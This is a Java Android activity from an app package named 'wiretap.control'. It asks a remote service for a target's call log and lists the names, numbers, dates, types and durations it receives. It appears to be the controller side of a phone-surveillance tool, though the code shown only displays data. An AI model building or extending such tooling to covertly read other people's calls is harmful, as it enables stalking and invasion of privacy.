package com.pgw.wiretap.control;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.os.Bundle;
import android.widget.ListView;
import android.widget.SimpleAdapter;

import com.alibaba.fastjson.JSONObject;
import com.pgw.wiretap.control.domain.CallsLog;
import com.pgw.wiretap.control.domain.MsgType;
import com.pgw.wiretap.control.utils.DateUtils;
import com.pgw.wiretap.control.utils.JsonUtils;
import com.pgw.wiretap.control.utils.MsgUtils;

public class CallsActivity extends BaseActivity {
	private ListView lv_calls_log_list;
	private String getter;
	private List<Map<String, Object>> data = new ArrayList<Map<String, Object>>();

	private void upadteListView(List<CallsLog> callsList) {
		for (CallsLog cLog : callsList) {
			Map<String, Object> map = new HashMap<String, Object>();
			map.put("id", cLog.getId());
			map.put("name", cLog.getName());
			map.put("number", cLog.getNumber());
			map.put("date", DateUtils.formartDate(cLog.getDate()));
			map.put("type", formartType(cLog.getType()));
			map.put("duration", formartDuration(cLog.getDuration()));
			data.add(map);
		}
		SimpleAdapter adapter = new SimpleAdapter(getApplicationContext(),
				data, R.layout.calls_log_list_item, new String[] { "name",
						"number", "date", "duration", "type" }, new int[] {
						R.id.tv_calls_log_list_item_name,
						R.id.tv_calls_log_list_item_number,
						R.id.tv_calls_log_list_item_date,
						R.id.tv_calls_log_list_item_duration,
						R.id.tv_calls_log_list_item_type });
		setContentView(R.layout.calls_log);
		lv_calls_log_list = (ListView) findViewById(R.id.lv_calls_log_list);
		lv_calls_log_list.setAdapter(adapter);

	}

	private String formartDuration(int duration) {
		int s = duration / 60;
		if (s < 1) {
			return duration + "秒";
		} else if (s < 60) {
			return s + "分钟" + (duration - (s * 60)) + "秒";
		}
		return "";
	}

	private String formartType(int type) {
		switch (type) {
		case 1:
			return "来电";
		case 2:
			return "外拨";
		case 3:
			return "未接";
		}
		return "";
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.progress_dialog_layout);

		getter = getIntent().getStringExtra("getter");
		MsgUtils.sendToService(getApplicationContext(), getter, MsgType.READ_CALLS_LOG);
	}

	@Override
	protected void receive(int type, String data) {
		switch (type) {
		case MsgType.CALLS_LOG_LIST:
			List<CallsLog> callsList = JsonUtils
					.json2list(data, CallsLog.class);
			upadteListView(callsList);

			break;
		}

	}

}
